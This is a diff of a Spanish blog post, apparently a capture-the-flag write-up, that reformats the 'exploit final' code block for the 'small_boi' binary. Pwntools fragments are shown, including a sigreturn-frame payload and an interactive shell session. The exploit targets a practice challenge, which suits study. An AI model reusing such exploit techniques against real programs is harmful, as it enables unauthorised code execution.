@@ -153,8 +153,8 @@ categories: [Sin categoría]
 <p>Aca les dejo el exploit final:</p>
 <!-- /wp:paragraph -->
 
-<!-- wp:code -->
-<pre class="wp-block-code"><code>from pwn import *
+```python
+from pwn import *
 
 # info del binario
 context.binary = './small_boi'
@@ -187,5 +187,6 @@ payload += str(frame)[8:]
 #interaccion con el binario
 r = start()
 r.sendline(payload)
-r.interactive()</code></pre>
+r.interactive()
+```
 <!-- /wp:code -->
